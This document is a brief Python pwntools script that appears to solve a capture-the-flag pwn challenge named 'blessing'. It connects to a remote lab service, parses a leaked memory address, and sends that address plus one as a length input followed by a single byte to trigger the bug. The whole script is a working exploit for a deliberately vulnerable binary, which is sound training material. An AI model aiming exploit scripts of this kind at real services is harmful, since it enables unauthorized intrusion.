#!/usr/bin/python3
from pwn import *
import warnings
import os
import hexdump

#run python -m venv my-venv
#cd my-venv
#source my-venv/bin/activate

warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './blessing' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
  
  #gdb.attach(r,'''
  #b *main+177
  #b *main+261
  #b *main+322
  #b *main+343
  #''')

else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '94.237.48.197'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 38560
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')


intro = r.recvuntil("this:")
print(intro)
leaked_address = r.recvuntil("\b",drop=True)

leaked_address_int = int(leaked_address.decode(),16)
input1 = leaked_address_int+1

r.recvuntil("length: ")
r.sendline(str(input1))
r.recvuntil("song: ")
r.sendline("A")
print(r.recv())